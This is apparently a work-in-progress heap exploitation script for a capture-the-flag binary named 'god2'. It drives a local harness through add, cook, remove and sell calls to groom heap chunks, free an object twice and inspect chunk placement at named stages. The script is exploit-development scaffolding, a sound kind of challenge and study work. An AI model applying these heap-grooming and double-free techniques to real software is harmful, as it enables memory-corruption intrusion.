import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G
STEP=sys.argv[1] if len(sys.argv)>1 else 'place'
g=G('god2')
# groom (NO early UNIQ777; cook-recipe X added late)
g.add(b'A1'); g.add(b'B2'); g.cook(b'Beef noodles'); g.add(b'YY'); g.add(b'Z9'); g.cook(b'Beef noodles')
for t in (b'B2',b'Z9',b'A1',b'YY'): g.rm(t)
g.add(b'CC')
g.cook(b'Beef noodles')   # drain1
g.cook(b'Beef noodles')   # drain2
g.add(b'XCOOK99')         # cook-recipe added LATE (top-adjacent?)
g.cook(b'XCOOK99')        # 3rd cook -> D3 @ YY ?
if STEP=='place':
    g.dump('placement: D3@YY? X top-adj?'); g.close(); sys.exit()
# add R, SLOT AFTER cooks (clean)
g.add(b'R'*16+b'A'); g.add(b'SLOTXX')
g.sell(b'2')                       # seed 0x40
g.rm(b'XCOOK99')                   # rm#1 free X recipe (consolidate into top?)
g.rm(b'XCOOK99')                   # rm#2 free D3
if STEP=='rm':
    g.dump('after rm x2 (lone 0x90?)'); g.close(); sys.exit()
g.add(b'FDDDDD')                   # FD: clean from top?
g.dump('after FD'); g.close()
